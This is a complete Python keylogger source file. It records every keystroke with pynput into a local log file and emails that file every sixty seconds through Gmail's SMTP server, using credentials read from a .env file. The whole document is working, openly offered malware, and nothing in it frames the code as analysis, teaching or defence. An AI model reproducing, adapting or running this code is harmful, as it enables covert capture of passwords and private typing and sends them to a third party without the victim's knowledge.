from pynput import keyboard
import smtplib
import threading
import os
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from dotenv import load_dotenv

load_dotenv()  # Loads variables from .env

EMAIL_ADDRESS = os.getenv("EMAIL")
EMAIL_PASSWORD = os.getenv("PASSWORD")
LOG_FILE = "keylog.txt"
SEND_INTERVAL = 60  # seconds

def write_to_file(key):
    with open(LOG_FILE, "a") as f:
        try:
            f.write(key.char)
        except AttributeError:
            if key == key.space:
                f.write(" ")
            else:
                f.write(f"[{key}]")

def send_email():
    if not os.path.exists(LOG_FILE):
        return

    if os.path.getsize(LOG_FILE) == 0:
        return  # Empty file, skip

    try:
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = EMAIL_ADDRESS
        msg['Subject'] = "Keylogger Log File"

        body = "Attached is the latest keylog file."
        msg.attach(MIMEText(body, 'plain'))

        # Attach the file
        with open(LOG_FILE, 'rb') as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename= {LOG_FILE}')
            msg.attach(part)

        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.send_message(msg)

        # Clear file after sending
        open(LOG_FILE, "w").close()

    except Exception as e:
        print(f"[!] Failed to send email: {e}")

    finally:
        timer = threading.Timer(SEND_INTERVAL, send_email)
        timer.daemon = True
        timer.start()

def start_keylogger():
    send_email()
    with keyboard.Listener(on_press=write_to_file) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
